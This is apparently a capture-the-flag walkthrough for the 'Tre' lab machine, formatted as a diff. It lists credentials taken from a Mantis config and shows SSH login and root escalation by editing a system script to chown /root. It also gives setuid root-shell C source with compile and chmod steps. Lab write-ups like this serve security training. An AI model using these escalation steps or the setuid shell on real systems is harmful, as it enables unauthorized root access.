@@ -1,0 +1,79 @@
+Find mantis/config with credentials:
+administrator	XiBejMub	root@localhost	3492f8fe2cb409e387ddb0521c999c38
+tre	Tr3@123456A!	tre@localhost	64c4685f8da5c2225de7890c1bad0d7f
+
+
+
+hack@kali:~/CTF/tre$ ssh tre@192.168.1.17
+The authenticity of host '192.168.1.17 (192.168.1.17)' can't be established.
+ECDSA key fingerprint is SHA256:wNJwlp5ha0nS3Mr1x6DPLtzNMMr/2egeef6B6N2hfsU.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '192.168.1.17' (ECDSA) to the list of known hosts.
+tre@192.168.1.17's password: 
+Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue May 12 23:56:00 2020 from 192.168.17.172
+tre@tre:~$ 
+
+
+
+
+Modify file and take owner of /root:
+tre@tre:/root$ cat /usr/bin/check-system 
+DATE=`date '+%Y-%m-%d %H:%M:%S'`
+echo "Service started at ${DATE}" | systemd-cat -p info
+#############################
+chown tre:root /root
+############################
+while :
+do
+echo "Checking...";
+sleep 1;
+done
+tre@tre:/root$ 
+
+
+
+
+hack@kali:~/CTF/tre$ ssh tre@192.168.1.17
+tre@192.168.1.17's password: 
+Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue May 26 12:12:21 2020 from 192.168.1.15
+tre@tre:~$ 
+tre@tre:~$ cd /root
+tre@tre:/root$ ls
+root.txt
+tre@tre:/root$ cat root.txt
+{SunCSR_Tr3_Viet_Nam_2020}
+tre@tre:/root$ 
+
+
+Alternative:
+// gcc -o /tmp/rootshell /tmp/rootshell.c
+// chmod u+s /tmp/rootshell
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0); setgid(0); system("/bin/bash");
+}
+
+Import rootshell to victim and execute it!
+
+
